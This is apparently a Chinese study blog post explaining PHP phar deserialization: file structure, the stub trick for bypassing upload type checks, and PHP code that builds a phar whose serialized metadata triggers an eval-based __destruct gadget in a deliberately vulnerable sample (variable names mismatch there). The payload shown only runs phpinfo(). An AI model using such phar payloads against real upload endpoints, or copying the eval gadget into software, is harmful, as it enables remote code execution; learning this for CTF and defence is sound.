+++
title = 'phar反序列化'
date = '2023-08-11T16:21:00+08:00'
categories = ['学习', 'web']
tags = ['phar', '安全']
+++

# phar反序列化

## phar是什么

像java中的jar一样，它是php中的一种压缩包。它可以存放多个文件，无需解压，php就能够访问并执行内部语句。

## phar构成部分

### stub phar

文件标识，也就是php能够通过这个标识来知道他是phar文件，格式为：
xxx<?php xxx; __HALT_COMPILER();?>，前面内容和中间内容不限，但必须以__HALT_COMPILER();结尾，这样php才能够识别是phar文件。
==因为前面的内容不限，在遇到限制文件格式时可以通过这点进行绕过。==

### manifest

用于存放压缩文件的权限属性等信息，并且用户自定义的meta-data(元数据)会以序列化的形式存储，这也是phar反序列化的攻击点。这里的meta-data我的理解为我们构造的序列化的数据。

### contents

被压缩文件的内容，这里文件名和文件内容随便写。因为我们最好要用到的是序列化后的内容，这里进行反序列化时也不会识别到它，这里看张图：![image-20230727164643019](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202307271646046.png)

### signature

签名。在文件末尾

## phar反序列化漏洞成因

### 前提条件

1.可以上传文件
2.有文件操作的函数
==因为它本身不能进行反序列化，这里要使用phar协议来访问文件，达到一个反序列化的效果。==

### phar文件生成

这里举个例子说明：
==注意==：要使用phar这个类，php.ini文件的phar.readonly选项要改为Off。

```php
<?php
    class test {
        public $a;
    }
    $phar = new Phar("test.phar"); //生成一个phar文件后缀名必须为phar
    $phar->startBuffering();//开始缓冲Phar 写操作
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub

    $o = new test();
    $o -> a='hacker';
    
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "aaa"); //添加要压缩的文件，内容为aaa
    //签名自动计算
    $phar->stopBuffering();//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘
?>
```

这里在开始创建文件时要$phar->startBuffering();开始写缓冲，结束时$phar->stopBuffering();停止写缓冲。

我们看一下生成的phar文件。
![image-20230727164652908](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202307271646940.png)

可以看到这里已经写进去我们构造的序列化后的内容，我们再通过phar协议去访问这个文件时，会进行一个反序列的操作，这里就将test类里面的a属性该为了 hacker，达到我们的目的。

## 题目小例子

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
    class Test{
    public $code;
    public function __destruct(){
        @eval($this -> code);
    }
}
$fil = $_GET['file'];
file_get_contents($file);
?>
```

这里我们通过构造Test类里面的code属性来进行代码执行。因为本地测试，这里把文件上传功能省了，直接去读取phar文件。

### 生成phar文件

```php
<?php
    class Test{
    public $code="phpinfo();";

}
$b=new Test();
$a=new phar("test.phar");
$a->startBuffering();
$a->setStub("<?php __HALT_COMPILER(); ?>");
$a->setMetadata($b);
$a->addFromString("test.txt", "aaa");
$a->stopBuffering();
?>
```

### 通过phar协议去访问phar文件

![image-20230727164706268](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202307271647312.png)

可以看到成功进行了反序列化操作。

## 总结

